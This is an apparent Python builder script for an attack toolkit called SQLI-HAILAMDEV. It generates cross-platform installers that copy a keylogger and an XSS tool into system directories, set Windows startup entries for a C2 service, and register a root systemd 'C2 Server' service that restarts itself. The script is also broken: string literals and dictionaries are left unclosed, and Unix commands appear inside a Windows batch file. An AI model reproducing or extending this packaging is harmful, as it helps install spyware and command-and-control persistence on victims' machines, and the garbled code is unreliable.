"""
SQLI-HAILAMDEV - Deployment Builder
Creates cross-platform deployment packages for Windows, macOS, and Linux.
"""

import os
import shutil
import subprocess
from pathlib import Path


def build_windows():
    """Build Windows deployment package."""
    print("Building Windows deployment package...")
    
    # Create Windows-specific files
    win_files = {
        "install.bat": """@echo off
REM SQLI-HAILAMDEV Windows Installer
REM Run as administrator

set TARGET_DIR=%CD%\SQLI-HAILAMDEV\bin\windows

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

REM Install keylogger
cp ../core/keylogger.exe "%TARGET_DIR%\\"

REM Install XSS framework
cp ../core/xss_tool.py "%TARGET_DIR%\\"

REM Create uninstall script
copy /B \"Uninstall_SQLI-HAILAMDEV.bat\" "%TARGET_DIR%\\"

REM Create startup script
cat > "%TARGET_DIR%\\startup.bat" << 'EOF'
@echo off
REM Auto-start SQLI-HAILAMDEV services
start "" "C:\ProgramData\SQLI-HAILAMDEV\services\c2_service.exe"
start "" "C:\ProgramData\SQLI-HAILAMDEV\services\sql_ioc_service.exe"
EOF

print("Windows package created at: %TARGET_DIR%")


def build_macos():
    """Build macOS deployment package."""
    print("Building macOS deployment package...")
    
    # Create macOS-specific files
    mac_files = {
        "install.sh": """#!/bin/bash
# SQLI-HAILAMDEV macOS Installer
# Run with sudo for proper permissions

TARGET_DIR=/opt/sqlihailamdev

if [ ! -d "$TARGET_DIR" ]; then
    mkdir -p "$TARGET_DIR"
fi

# Install binaries
cp ../core/keylogger.exe "$TARGET_DIR/"
cp ../core/xss_tool.py "$TARGET_DIR/"

# Create launch daemon
cat > "$TARGET_DIR/LaunchSQLI-HAILAMDEV.dmg" << 'EOF'
This is a placeholder for the DMG installer.
In production, this would contain the compiled binaries and setup scripts.
EOF

print("macOS package created at: $TARGET_DIR%")


def build_linux():
    """Build Linux deployment package."""
    print("Building Linux deployment package...")
    
    # Create Linux-specific files
    linux_files = {
        "install.sh": """#!/bin/bash
# SQLI-HAILAMDEV Linux Installer
# Run with sudo for proper permissions

TARGET_DIR=/opt/sqlihailamdev

if [ ! -d "$TARGET_DIR" ]; then
    mkdir -p "$TARGET_DIR"
fi

# Install binaries
cp ../core/keylogger.exe "$TARGET_DIR/"
cp ../core/xss_tool.py "$TARGET_DIR/"

# Create systemd service
cat > "$TARGET_DIR/service_sqlihailamdev.service" << EOF
[Unit]
Description=SQLI-HAILAMDEV C2 Server
After=network.target

[Service]
Type=simple
ExecStart=$TARGET_DIR/start_c2_server
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

print("Linux package created at: $TARGET_DIR%")


def build_all():
    """Build all platforms."""
    print("=== Building SQLI-HAILAMDEV Deployment Packages ===\n")
    
    build_windows()
    build_macos()
    build_linux()
    
    print("\n=== Build Complete ===")
    print("Packages created:")
    print("  - Windows: %s\n" % os.path.abspath("/home/hainx/Documents/SQLI-HAILAMDEV/windows"))
    print("  - macOS: %s\n" % os.path.abspath("/home/hainx/Documents/SQLI-HAILAMDEV/macos"))
    print("  - Linux: %s\n" % os.path.abspath("/home/hainx/Documents/SQLI-HAILAMDEV/linux"))


if __name__ == "__main__":
    build_all()
